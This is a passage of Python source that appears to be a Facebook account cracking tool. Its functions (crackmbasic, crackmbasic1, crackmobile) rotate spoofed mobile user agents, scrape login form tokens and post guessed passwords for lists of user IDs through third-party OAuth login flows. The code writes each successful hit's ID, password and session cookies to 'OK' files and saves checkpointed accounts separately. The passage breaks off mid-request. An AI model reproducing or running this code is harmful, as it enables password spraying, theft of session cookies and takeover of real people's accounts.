Version/4.0 Chrome/97.0.4744.80 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10.0; Infinix X659B Build/TP1A.122927.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4261.134 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12.0; Nokia C20 Plus Build/RP1A.137428.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.4785.100 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 3.0; Infinix X662 Build/RKQ1.177039.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4279.113 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5; Infinix X659B Build/RKQ1.187861.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4591.135 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.5; 21121210G Build/PKQ1.119094.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4521.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11.0; POCO F2 Pro Build/SP1A.183238.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.4574.147 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; 220333QPG Build/QP1A.138685.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.4582.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9.5; M2012K11AG Build/RP1A.180354.015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.4316.88 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 2; Nokia C21 Build/QP1A.195798.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.4356.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; SM-J530F Build/RP1A.111653.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4339.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5; RMX3063 Build/PKQ1.119980.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4449.104 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; Infinix PR652B Build/SP1A.169510.015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4749.41 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 2.0; 22081212UG Build/RKQ1.129139.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4847.139 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 7; WOW64 Build/PKQ1.162182.015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.4524.57 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 1; Infinix Hot 10 Build/PPR1.160261.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.4850.48 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 2.5; WOW64 Build/RKQ1.136188.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4259.119 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; 22081212UG Build/TP1A.130300.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.4520.65 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; 22081212UG Build/QP1A.165082.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.4271.146 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0; oppo 15 Build/SP1A.119831.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.4743.87 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; CPH1861 Build/RP1A.172977.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.4504.121 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; RMX3063 Build/PKQ1.152693.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4501.127 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; RMX1805 Build/RP1A.156816.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4440.130 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 1; SM-A307FN Build/PPR1.168134.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4383.147 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12.0; SM-G900P Build/PKQ1.137595.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4213.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; PCHM10 Build/OPM1.174137.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4680.144 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; SM-G610M Build/QP1A.142453.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.4669.58 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; 21121210G Build/QP1A.178831.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4415.128 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; 220233L2G Build/QP1A.146814.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.4622.93 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 1.5; WOW64 Build/TP1A.132503.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.4883.98 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 1; WOW64 Build/OPM1.143998.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.4220.136 Mobile Safari/537.36'])
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=965240837599503&kid_directed_site=0&app_id=965240837599503&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D965240837599503%26redirect_uri%3Dhttps%253A%252F%252Fauth.crazygames.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDlAYxOIXwoN5CUrJXpeUp1a5j7NJZqFA2Q6G6uo4Dd9MPwh-Stff8W3D5AuTMnqgE7z8LUZhlCMHgK8_tLi0xCBwF_RhbV_MdASAuEED1N3E1SXJ0pHWnv9BcUX87n79KJ2ch5Odra03-RYiwWNFJKBSHQzlTpdQSDXV8gBwkP6VDEFXEvqsDq9t22PfJBw63Iq0rbgiY0fV6mj7JcLwz9RNHeqb7L0yxXnmsEAYmw85PoLIZjLY7P6_nLczSHu-TmdoHpx1KcPhoGBHTu7fLfMY_OY3mUdjR0qYYSB0SOOWRyDumMESVEoe9N3UDLInC1W%26scope%3Dpublic_profile%252Cemail%26context_uri%3Dhttps%253A%252F%252Fwww.crazygames.co.id%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbf344e76-6099-41fd-8a69-1948eb7b0c5d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.crazygames.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDlAYxOIXwoN5CUrJXpeUp1a5j7NJZqFA2Q6G6uo4Dd9MPwh-Stff8W3D5AuTMnqgE7z8LUZhlCMHgK8_tLi0xCBwF_RhbV_MdASAuEED1N3E1SXJ0pHWnv9BcUX87n79KJ2ch5Odra03-RYiwWNFJKBSHQzlTpdQSDXV8gBwkP6VDEFXEvqsDq9t22PfJBw63Iq0rbgiY0fV6mj7JcLwz9RNHeqb7L0yxXnmsEAYmw85PoLIZjLY7P6_nLczSHu-TmdoHpx1KcPhoGBHTu7fLfMY_OY3mUdjR0qYYSB0SOOWRyDumMESVEoe9N3UDLInC1W%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=965240837599503&redirect_uri=https%3A%2F%2Fauth.crazygames.com%2F__%2Fauth%2Fhandler&state=AMbdmDlAYxOIXwoN5CUrJXpeUp1a5j7NJZqFA2Q6G6uo4Dd9MPwh-Stff8W3D5AuTMnqgE7z8LUZhlCMHgK8_tLi0xCBwF_RhbV_MdASAuEED1N3E1SXJ0pHWnv9BcUX87n79KJ2ch5Odra03-RYiwWNFJKBSHQzlTpdQSDXV8gBwkP6VDEFXEvqsDq9t22PfJBw63Iq0rbgiY0fV6mj7JcLwz9RNHeqb7L0yxXnmsEAYmw85PoLIZjLY7P6_nLczSHu-TmdoHpx1KcPhoGBHTu7fLfMY_OY3mUdjR0qYYSB0SOOWRyDumMESVEoe9N3UDLInC1W&scope=public_profile%2Cemail&context_uri=https%3A%2F%2Fwww.crazygames.co.id&ret=login&fbapp_pres=0&logger_id=bf344e76-6099-41fd-8a69-1948eb7b0c5d&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=965240837599503&kid_directed_site=0&app_id=965240837599503&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D965240837599503%26redirect_uri%3Dhttps%253A%252F%252Fauth.crazygames.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDlAYxOIXwoN5CUrJXpeUp1a5j7NJZqFA2Q6G6uo4Dd9MPwh-Stff8W3D5AuTMnqgE7z8LUZhlCMHgK8_tLi0xCBwF_RhbV_MdASAuEED1N3E1SXJ0pHWnv9BcUX87n79KJ2ch5Odra03-RYiwWNFJKBSHQzlTpdQSDXV8gBwkP6VDEFXEvqsDq9t22PfJBw63Iq0rbgiY0fV6mj7JcLwz9RNHeqb7L0yxXnmsEAYmw85PoLIZjLY7P6_nLczSHu-TmdoHpx1KcPhoGBHTu7fLfMY_OY3mUdjR0qYYSB0SOOWRyDumMESVEoe9N3UDLInC1W%26scope%3Dpublic_profile%252Cemail%26context_uri%3Dhttps%253A%252F%252Fwww.crazygames.co.id%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbf344e76-6099-41fd-8a69-1948eb7b0c5d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.crazygames.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDlAYxOIXwoN5CUrJXpeUp1a5j7NJZqFA2Q6G6uo4Dd9MPwh-Stff8W3D5AuTMnqgE7z8LUZhlCMHgK8_tLi0xCBwF_RhbV_MdASAuEED1N3E1SXJ0pHWnv9BcUX87n79KJ2ch5Odra03-RYiwWNFJKBSHQzlTpdQSDXV8gBwkP6VDEFXEvqsDq9t22PfJBw63Iq0rbgiY0fV6mj7JcLwz9RNHeqb7L0yxXnmsEAYmw85PoLIZjLY7P6_nLczSHu-TmdoHpx1KcPhoGBHTu7fLfMY_OY3mUdjR0qYYSB0SOOWRyDumMESVEoe9N3UDLInC1W%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r{x}[{b}âœ“{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kukis)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
	
def crackmbasic(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r{h}V3 {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=752204422780183&kid_directed_site=0&app_id=752204422780183&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D752204422780183%26cbt%3D1665791811787%26e2e%3D%257B%2522init%2522%253A1665791811787%257D%26ies%3D1%26sdk%3Dandroid-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Dgaming_user_picture%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25221b4e1960-bf04-408d-be3f-f33d4d47ef8a%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522vqonroapgg3std254ias%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb752204422780183%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1b4e1960-bf04-408d-be3f-f33d4d47ef8a%26tp%3Dunspecified&cancel_url=fb752204422780183%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25221b4e1960-bf04-408d-be3f-f33d4d47ef8a%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522vqonroapgg3std254ias%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/v11.0/dialog/oauth?cct_prefetching=0&client_id=2572246932852997&cbt=1683856329219&e2e=%7B%22init%22%3A1683856329219%7D&ies=1&sdk=android-11.3.0&sso=chrome_custom_tab&scope=public_profile&state=%7B%220_auth_logger_id%22%3A%2206fd9384-3745-4859-bf4a-ff5cfaf4f4df%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22c0b731ku3l0t4lo6vof3%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.pure.indosat.care&auth_type=rerequest&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&ret=login&fbapp_pres=0&logger_id=06fd9384-3745-4859-bf4a-ff5cfaf4f4df&tp=unspecified"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r{x}[{b}âœ“{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kukis)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
	
def crackmbasic1(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r{h}V2 {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"AlohaBrowser","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=161024417255724&kid_directed_site=0&app_id=161024417255724&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fapp_id%3D161024417255724%26cbt%3D1698411964205%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df319ccaaa650ebc%2526domain%253Dwww.peopleperhour.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.peopleperhour.com%25252Ff28a131aba82098%2526relation%253Dopener%26client_id%3D161024417255724%26display%3Dtouch%26domain%3Dwww.peopleperhour.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.peopleperhour.com%252Fsite%252Flogin%26locale%3Den_US%26logger_id%3Dfd769d54160cb4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df241253f11e5be%2526domain%253Dwww.peopleperhour.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.peopleperhour.com%25252Ff28a131aba82098%2526relation%253Dopener%2526frame%253Df369665adcb00b4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv8.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df241253f11e5be%26domain%3Dwww.peopleperhour.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.peopleperhour.com%252Ff28a131aba82098%26relation%3Dopener%26frame%3Df369665adcb00b4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v8.0/dialog/oauth?app_id=161024417255724&cbt=1698411964205&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df319ccaaa650ebc%26domain%3Dwww.peopleperhour.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.peopleperhour.com%252Ff28a131aba82098%26relation%3Dopener&client_id=161024417255724&display=touch&domain=www.peopleperhour.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.peopleperhour.com%2Fsite%2Flogin&locale=en_US&logger_id=fd769d54160cb4&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df241253f11e5be%26domain%3Dwww.peopleperhour.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.peopleperhour.com%252Ff28a131aba82098%26relation%3Dopener%26frame%3Df369665adcb00b4&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=public_profile%2Cemail&sdk=joey&version=v8.0&refsrc=deprecated&ret=login&fbapp_pres=0&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"AlohaBrowser","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r{x}[{b}âœ“{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kukis)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1

###----------[  MOBILE ]----------###
def crackmobile(idf,pwv):
	bo = random.choice([m,k,h,b,u,x])
	global loop,ok,cp
	prog.update(des,description=f'\r{h}RE {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 